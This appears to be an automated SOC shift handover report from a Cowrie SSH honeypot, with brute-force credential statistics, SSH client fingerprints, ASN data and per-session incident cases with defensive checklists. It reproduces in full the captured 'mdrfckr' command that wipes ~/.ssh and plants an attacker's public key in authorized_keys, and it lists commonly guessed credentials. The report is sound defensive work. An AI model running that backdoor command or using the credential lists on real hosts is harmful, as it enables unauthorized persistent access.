# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-11 |
| **Generated At** | 2026-07-11T19:10:41Z |
| **Shift Time** | 19:10 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **143** |
| Confirmed Threats | **130** |
| False Positives Filtered | **13** (9.1%) |
| Unique Attacker IPs | **64** |
| Countries of Origin | **21** |
| High Severity Cases | **55** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **88** |
| Malware Samples Analyzed | **5** HIGH · **36** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **80** |
| Unique Credential Pairs | **40** |
| Unique Usernames | **16** |
| Unique Passwords | **37** |
| Successful Auth Pairs | **71** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 32 |
| `support` | 9 |
| `unknown` | 8 |
| `ubuntu` | 5 |
| `345gs5662d34` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `P@ssw0rd123` | 5 |
| `4444444` | 5 |
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 4 |
| `2222222222` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `P@ssw0rd123` | 5 |
| `support` | `4444444` | 5 |
| `345gs5662d34` | `345gs5662d34` | 4 |
| `unknown` | `2222222222` | 4 |
| `support` | `001122` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `chenyufei-srt` | `1` | `2.58.172.185` | 2026-07-11T16:55:27 |
| `ubnt` | `1234` | `10.0.0.73` | 2026-07-11T16:56:57 |
| `root` | `qingshan@123` | `45.198.224.120` | 2026-07-11T16:57:30 |
| `root` | `1234qwer@` | `59.179.31.237` | 2026-07-11T16:58:45 |
| `root` | `qwerty1` | `103.235.95.102` | 2026-07-11T16:58:45 |
| `345gs5662d34` | `345gs5662d34` | `59.179.31.237` | 2026-07-11T16:58:50 |
| `root` | `3245gs5662d34` | `59.179.31.237` | 2026-07-11T16:58:52 |
| `root` | `ztgame@123` | `69.229.227.44` | 2026-07-11T16:59:06 |
| `345gs5662d34` | `345gs5662d34` | `69.229.227.44` | 2026-07-11T16:59:08 |
| `root` | `3245gs5662d34` | `69.229.227.44` | 2026-07-11T16:59:08 |
| `ubnt` | `1234` | `185.242.3.195` | 2026-07-11T17:01:16 |
| `root` | `qwerty1` | `10.0.0.73` | 2026-07-11T17:02:46 |
| `unknown` | `2222222222` | `14.54.22.11` | 2026-07-11T17:11:44 |
| `ubuntu` | `321` | `45.198.224.120` | 2026-07-11T17:11:49 |
| `support` | `001122` | `102.90.34.90` | 2026-07-11T17:14:37 |
| `root` | `Ar123455` | `185.242.3.195` | 2026-07-11T17:15:16 |
| `unknown` | `2222222222` | `60.171.135.254` | 2026-07-11T17:15:17 |
| `unknown` | `2222222222` | `10.0.0.73` | 2026-07-11T17:15:42 |
| `root` | `﻿------fuck------` | `120.48.26.113` | 2026-07-11T17:16:38 |
| `support` | `001122` | `65.20.179.251` | 2026-07-11T17:18:02 |
| `support` | `001122` | `10.0.0.73` | 2026-07-11T17:18:22 |
| `root` | `P@ssw0rd123` | `60.166.31.198` | 2026-07-11T17:24:39 |
| `root` | `P@ssw0rd123` | `102.211.7.162` | 2026-07-11T17:24:51 |
| `root` | `1p2o3i` | `45.198.224.120` | 2026-07-11T17:26:15 |
| `root` | `P@ssw0rd123` | `85.195.9.20` | 2026-07-11T17:28:04 |
| `root` | `P@ssw0rd123` | `10.0.0.73` | 2026-07-11T17:28:29 |
| `root` | `Ar123455` | `10.0.0.73` | 2026-07-11T17:29:46 |
| `samba` | `123456` | `112.197.2.116` | 2026-07-11T17:37:00 |
| `unknown` | `qwerty12` | `212.3.154.183` | 2026-07-11T17:37:59 |
| `unknown` | `qwerty12` | `196.190.180.18` | 2026-07-11T17:38:12 |
| `ubuntu` | `root123` | `45.198.224.120` | 2026-07-11T17:40:33 |
| `unknown` | `qwerty12` | `41.214.10.178` | 2026-07-11T17:41:29 |
| `unknown` | `qwerty12` | `10.0.0.73` | 2026-07-11T17:42:03 |
| `admin` | `admin` | `86.153.178.149` | 2026-07-11T17:43:51 |
| `centos` | `centos22` | `10.0.0.73` | 2026-07-11T17:44:52 |
| `root` | `qwer12345` | `185.242.3.195` | 2026-07-11T17:48:02 |
| `nobody` | `nobody1234567890` | `196.188.93.169` | 2026-07-11T17:54:53 |
| `root` | `qEj5EDAr:plesk:pass` | `45.198.224.120` | 2026-07-11T17:54:55 |
| `nobody` | `nobody1234567890` | `111.17.213.162` | 2026-07-11T17:55:06 |
| `nobody` | `nobody1234567890` | `10.0.0.73` | 2026-07-11T17:55:18 |
| `root` | `debian` | `101.96.192.88` | 2026-07-11T18:00:46 |
| `root` | `qwer12345` | `10.0.0.73` | 2026-07-11T18:02:37 |
| `support` | `4444444` | `1.212.225.99` | 2026-07-11T18:04:26 |
| `support` | `4444444` | `62.220.104.155` | 2026-07-11T18:04:39 |
| `root` | `root888` | `65.20.158.10` | 2026-07-11T18:06:57 |
| `support` | `4444444` | `66.45.144.201` | 2026-07-11T18:07:59 |
| `support` | `4444444` | `49.124.153.26` | 2026-07-11T18:08:11 |
| `support` | `4444444` | `10.0.0.73` | 2026-07-11T18:08:23 |
| `toto` | `toto` | `45.198.224.120` | 2026-07-11T18:09:14 |
| `root` | `root888` | `10.0.0.73` | 2026-07-11T18:10:52 |
| `root` | `uploader` | `10.0.0.73` | 2026-07-11T18:20:36 |
| `ubuntu` | `myubuntu123` | `185.242.3.195` | 2026-07-11T18:21:11 |
| `remoto` | `1234` | `178.105.180.108` | 2026-07-11T18:23:38 |
| `345gs5662d34` | `345gs5662d34` | `178.105.180.108` | 2026-07-11T18:23:41 |
| `remoto` | `3245gs5662d34` | `178.105.180.108` | 2026-07-11T18:23:41 |
| `root` | `Password@123` | `45.198.224.120` | 2026-07-11T18:23:54 |
| `supervisor` | `supervisor123456789` | `49.124.147.109` | 2026-07-11T18:33:29 |
| `supervisor` | `supervisor123456789` | `60.174.35.18` | 2026-07-11T18:33:39 |
| `supervisor` | `supervisor123456789` | `10.0.0.73` | 2026-07-11T18:33:52 |
| `ubuntu` | `myubuntu123` | `10.0.0.73` | 2026-07-11T18:35:46 |
| `operator` | `alpine` | `117.248.201.39` | 2026-07-11T18:35:53 |
| `operator` | `alpine` | `10.0.0.73` | 2026-07-11T18:36:18 |
| `root` | `qwerasdf` | `45.198.224.120` | 2026-07-11T18:39:10 |
| `admin` | `admin` | `47.252.16.44` | 2026-07-11T18:42:14 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-11T18:42:15 |
| `root` | `R00T` | `183.89.208.174` | 2026-07-11T18:42:45 |
| `bot` | `12345` | `10.0.0.73` | 2026-07-11T18:44:22 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-11T18:44:26 |
| `bot` | `3245gs5662d34` | `10.0.0.73` | 2026-07-11T18:44:27 |
| `root` | `asdfgasdfg` | `45.198.224.120` | 2026-07-11T18:53:39 |
| `root` | `princess` | `185.242.3.195` | 2026-07-11T18:54:03 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **143** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 23 |
| OpenSSH | 22 |
| libssh | 16 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 22 | 22 |
| `16443846184e...` | Generic scanner | 19 | 4 |
| `f555226df196...` | Mirai/variant | 10 | 4 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 22 | 22 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 19 | 4 | Generic scanner |
| `f555226df196...` | libssh | 10 | 4 | Mirai/variant |
| `95420f9d932d...` | libssh | 5 | 2 | — |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `178.105.180.108`, `59.179.31.237`, `69.229.227.44`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **64** |
| Unique ASNs | **45** |
| High-Risk ASNs | **36** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS398324` | Censys, Inc. | 5 | HIGH |
| `AS22773` | Cox Communications Inc. | 4 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 3 | HIGH |
| `AS396982` | Google LLC | 3 | LOW |
| `AS24757` | Ethio Telecom | 2 | HIGH |
| `AS33765` | TANZANIA TELECOMMUNICATIONS CO. LTD | 2 | LOW |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (55)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e957de63367a

| Field | Detail |
|---|---|
| **Source IP** | `2.58.172[.]185` |
| **First Seen** | 2026-07-11 16:55 |
| **Last Seen** | 2026-07-11 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 16:55:27` | `cowrie.session.connect` |
| `2026-07-11 16:55:27` | `cowrie.client.version` |
| `2026-07-11 16:55:27` | `cowrie.client.kex` |
| `2026-07-11 16:55:27` | `cowrie.login.success` |
| `2026-07-11 16:55:28` | `cowrie.session.params` |
| `2026-07-11 16:55:28` | `cowrie.command.input` |
| `2026-07-11 16:55:28` | `cowrie.log.closed` |
| `2026-07-11 16:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.58.172[.]185` to AbuseIPDB if not already reported
- [ ] Block `2.58.172[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2738d06b7a40

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-11 16:57 |
| **Last Seen** | 2026-07-11 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 16:57:29` | `cowrie.session.connect` |
| `2026-07-11 16:57:29` | `cowrie.client.version` |
| `2026-07-11 16:57:29` | `cowrie.client.kex` |
| `2026-07-11 16:57:30` | `cowrie.login.success` |
| `2026-07-11 16:57:31` | `cowrie.session.params` |
| `2026-07-11 16:57:31` | `cowrie.command.input` |
| `2026-07-11 16:57:31` | `cowrie.log.closed` |
| `2026-07-11 16:57:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1eceee0c2ff

| Field | Detail |
|---|---|
| **Source IP** | `103.235.95[.]102` |
| **First Seen** | 2026-07-11 16:58 |
| **Last Seen** | 2026-07-11 17:03 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 16:58:42` | `cowrie.session.connect` |
| `2026-07-11 16:58:43` | `cowrie.client.version` |
| `2026-07-11 16:58:43` | `cowrie.client.kex` |
| `2026-07-11 16:58:45` | `cowrie.login.success` |
| `2026-07-11 16:58:46` | `cowrie.direct-tcpip.request` |
| `2026-07-11 17:03:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.235.95[.]102` to AbuseIPDB if not already reported
- [ ] Block `103.235.95[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e1e0b011355

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-07-11 16:58 |
| **Last Seen** | 2026-07-11 16:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 16:58:43` | `cowrie.session.connect` |
| `2026-07-11 16:58:43` | `cowrie.client.version` |
| `2026-07-11 16:58:44` | `cowrie.client.kex` |
| `2026-07-11 16:58:45` | `cowrie.login.success` |
| `2026-07-11 16:58:46` | `cowrie.session.params` |
| `2026-07-11 16:58:46` | `cowrie.command.input` |
| `2026-07-11 16:58:46` | `cowrie.command.failed` |
| `2026-07-11 16:58:47` | `cowrie.log.closed` |
| `2026-07-11 16:58:48` | `cowrie.session.params` |
| `2026-07-11 16:58:48` | `cowrie.command.input` |
| `2026-07-11 16:58:48` | `cowrie.session.file_download` |
| `2026-07-11 16:58:48` | `cowrie.log.closed` |
| `2026-07-11 16:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7357190a231a

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-07-11 16:58 |
| **Last Seen** | 2026-07-11 16:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 16:58:48` | `cowrie.session.connect` |
| `2026-07-11 16:58:48` | `cowrie.client.version` |
| `2026-07-11 16:58:49` | `cowrie.client.kex` |
| `2026-07-11 16:58:50` | `cowrie.login.success` |
| `2026-07-11 16:58:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bb6e8254834

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-07-11 16:58 |
| **Last Seen** | 2026-07-11 16:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 16:58:50` | `cowrie.session.connect` |
| `2026-07-11 16:58:50` | `cowrie.client.version` |
| `2026-07-11 16:58:51` | `cowrie.client.kex` |
| `2026-07-11 16:58:52` | `cowrie.login.success` |
| `2026-07-11 16:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e2bbf9e4328

| Field | Detail |
|---|---|
| **Source IP** | `69.229.227[.]44` |
| **First Seen** | 2026-07-11 16:59 |
| **Last Seen** | 2026-07-11 16:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 16:59:06` | `cowrie.session.connect` |
| `2026-07-11 16:59:06` | `cowrie.client.version` |
| `2026-07-11 16:59:06` | `cowrie.client.kex` |
| `2026-07-11 16:59:06` | `cowrie.login.success` |
| `2026-07-11 16:59:07` | `cowrie.session.params` |
| `2026-07-11 16:59:07` | `cowrie.command.input` |
| `2026-07-11 16:59:07` | `cowrie.command.failed` |
| `2026-07-11 16:59:07` | `cowrie.log.closed` |
| `2026-07-11 16:59:07` | `cowrie.session.params` |
| `2026-07-11 16:59:07` | `cowrie.command.input` |
| `2026-07-11 16:59:07` | `cowrie.session.file_download` |
| `2026-07-11 16:59:07` | `cowrie.log.closed` |
| `2026-07-11 16:59:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.229.227[.]44` to AbuseIPDB if not already reported
- [ ] Block `69.229.227[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87f6638b2a04

| Field | Detail |
|---|---|
| **Source IP** | `69.229.227[.]44` |
| **First Seen** | 2026-07-11 16:59 |
| **Last Seen** | 2026-07-11 16:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 16:59:07` | `cowrie.session.connect` |
| `2026-07-11 16:59:07` | `cowrie.client.version` |
| `2026-07-11 16:59:07` | `cowrie.client.kex` |
| `2026-07-11 16:59:08` | `cowrie.login.success` |
| `2026-07-11 16:59:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.229.227[.]44` to AbuseIPDB if not already reported
- [ ] Block `69.229.227[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df8333d1b3af

| Field | Detail |
|---|---|
| **Source IP** | `69.229.227[.]44` |
| **First Seen** | 2026-07-11 16:59 |
| **Last Seen** | 2026-07-11 16:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 16:59:08` | `cowrie.session.connect` |
| `2026-07-11 16:59:08` | `cowrie.client.version` |
| `2026-07-11 16:59:08` | `cowrie.client.kex` |
| `2026-07-11 16:59:08` | `cowrie.login.success` |
| `2026-07-11 16:59:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.229.227[.]44` to AbuseIPDB if not already reported
- [ ] Block `69.229.227[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c7a08ecbfae

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 17:01 |
| **Last Seen** | 2026-07-11 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:01:15` | `cowrie.session.connect` |
| `2026-07-11 17:01:15` | `cowrie.client.version` |
| `2026-07-11 17:01:15` | `cowrie.client.kex` |
| `2026-07-11 17:01:16` | `cowrie.login.success` |
| `2026-07-11 17:01:16` | `cowrie.session.params` |
| `2026-07-11 17:01:16` | `cowrie.command.input` |
| `2026-07-11 17:01:17` | `cowrie.log.closed` |
| `2026-07-11 17:01:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fd13b1bb7d8

| Field | Detail |
|---|---|
| **Source IP** | `14.54.22[.]11` |
| **First Seen** | 2026-07-11 17:11 |
| **Last Seen** | 2026-07-11 17:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:11:41` | `cowrie.session.connect` |
| `2026-07-11 17:11:42` | `cowrie.client.version` |
| `2026-07-11 17:11:42` | `cowrie.client.kex` |
| `2026-07-11 17:11:44` | `cowrie.login.success` |
| `2026-07-11 17:11:45` | `cowrie.direct-tcpip.request` |
| `2026-07-11 17:11:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.54.22[.]11` to AbuseIPDB if not already reported
- [ ] Block `14.54.22[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c9946998f45

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-11 17:11 |
| **Last Seen** | 2026-07-11 17:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:11:48` | `cowrie.session.connect` |
| `2026-07-11 17:11:48` | `cowrie.client.version` |
| `2026-07-11 17:11:49` | `cowrie.client.kex` |
| `2026-07-11 17:11:49` | `cowrie.login.success` |
| `2026-07-11 17:11:50` | `cowrie.session.params` |
| `2026-07-11 17:11:50` | `cowrie.command.input` |
| `2026-07-11 17:11:50` | `cowrie.log.closed` |
| `2026-07-11 17:11:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49dd15b09938

| Field | Detail |
|---|---|
| **Source IP** | `102.90.34[.]90` |
| **First Seen** | 2026-07-11 17:14 |
| **Last Seen** | 2026-07-11 17:19 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:14:35` | `cowrie.session.connect` |
| `2026-07-11 17:14:36` | `cowrie.client.version` |
| `2026-07-11 17:14:36` | `cowrie.client.kex` |
| `2026-07-11 17:14:37` | `cowrie.login.success` |
| `2026-07-11 17:14:38` | `cowrie.direct-tcpip.request` |
| `2026-07-11 17:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.90.34[.]90` to AbuseIPDB if not already reported
- [ ] Block `102.90.34[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84b7567b2272

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 17:15 |
| **Last Seen** | 2026-07-11 17:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:15:12` | `cowrie.session.connect` |
| `2026-07-11 17:15:14` | `cowrie.client.version` |
| `2026-07-11 17:15:14` | `cowrie.client.kex` |
| `2026-07-11 17:15:16` | `cowrie.login.success` |
| `2026-07-11 17:15:17` | `cowrie.session.params` |
| `2026-07-11 17:15:17` | `cowrie.command.input` |
| `2026-07-11 17:15:17` | `cowrie.log.closed` |
| `2026-07-11 17:15:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a69ceaade60a

| Field | Detail |
|---|---|
| **Source IP** | `60.171.135[.]254` |
| **First Seen** | 2026-07-11 17:15 |
| **Last Seen** | 2026-07-11 17:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 17:15:14` | `cowrie.session.connect` |
| `2026-07-11 17:15:15` | `cowrie.client.version` |
